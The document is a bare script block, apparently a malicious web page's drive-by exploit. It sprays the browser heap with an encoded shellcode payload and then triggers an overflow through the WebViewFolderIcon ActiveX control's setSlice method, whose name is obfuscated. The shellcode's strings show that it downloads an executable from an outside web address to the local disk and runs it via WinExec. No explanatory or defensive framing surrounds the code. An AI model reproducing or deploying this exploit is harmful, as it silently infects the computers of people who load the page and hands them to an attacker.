<script language="javascript">
 var heapSprayToAddress = 0x04040000+0x01010505; 
 var infernalis_ = unescape("
%u9090%u9090%u9090%u9090%u00e8%u0000%u5d00%ued81%u11ce%u0040%ucce8%u0000%u8d00%u5e85%u4012%ue800%u0007%u0000%u7275%u6d6c%u6e6f%ue800%u011e%u0000%uc389%u858d%u131e%u0040%u13e8%u0000%u5500%u4c52%u6f44%u6e77%u6f6c%u6461%u6f54%u6946%u656c%u0041%ue853%u00f8%u0000%u9090%u8d8d%u127f%u0040%u006a%u006a%u09e8%u0000%u6300%u5c3a%u2e74%u6e69%u0078%u6a51%uff00%u8dd0%u6b85%u4012%u6a00%ue800%u0009%u0000%u3a63%u745c%u692e%u786e%ue800%u00be%u0000%u858d%u1273%u0040%u006a%ub1e8%u0000%u4c00%u616f%u4c64%u6269%u6172%u7972%u0041%u6957%u456e%u6578%u0063%u7845%u7469%u7250%u636f%u7365%u0073%u7468%u7074%u2f3a%u632f%u646f%u6365%u6f73%u7466%u6e2e%u7465%u612f%u7664%u302f%u3833%u772f%u6e69%u3233%u652e%u6578%u6000%u8b64%u301d%u0000%u8b00%u0c5b%u5b8b%u8b1c%u8b1b%u085b%uda89%u9d89%u132d%u0040%u7b8b%u013c%u03d7%u785f%u4b8b%u8b18%u2073%u7b8b%u0124%u01d6%ufcd7%u01ad%u51d0%u9657%ubd8d%u131e%u0040%u0fb9%u0000%uf300%u96a6%u595f%u0674%u4747%ue4e2%uc4eb%uc031%u8b66%uc107%u02e0%u738b%u011c%u01d6%uadc6%ud001%u8589%u1331%u0040%uc361%uff50%u2db5%u4013%uff00%u3195%u4013%uff00%u47e0%u7465%u7250%u636f%u6441%u7264%u7365%u0073%u0000%u0000%u0000%u0000"); 
var heapBlockSize = 0x200000+0x200000;
var payLoadSize = infernalis_.length + infernalis_.length;
var spraySlideSize = heapBlockSize - (payLoadSize+0x30+0x8);
var spraySlide = unescape("%u0"+"c0c%u"+"0c0c");
spraySlide = getSpraySlide(spraySlide,spraySlideSize);
heapBlocks = (heapSprayToAddress - 0x400000)/heapBlockSize;
memory = new Array();
for (i=0;i<heapBlocks;i++) { memory[i] = spraySlide + infernalis_; }
for ( i = 0 ; i < 128 ; i++) { try{ 
var empto='';
var tar = new ActiveXObject('We'+empto+'bVi'+'ew'+empto+'Fol'+'de'+empto+'rIc'+'on.'+'We'+empto+'bViewF'+'old'+empto+'erIc'+'on.1');
var xnum=0x0c0c0c0c0;
tar.setSlice(0x7ffffffe, xnum, xnum,xnum );
}catch(e){} } function getSpraySlide(spraySlide, spraySlideSize)
{ 
var xsize=spraySlide.length+spraySlide.length;
while (xsize<spraySlideSize)
{ spraySlide += spraySlide; } 
spraySlide = spraySlide.substring(0,spraySlideSize/2);
return spraySlide; }
</script>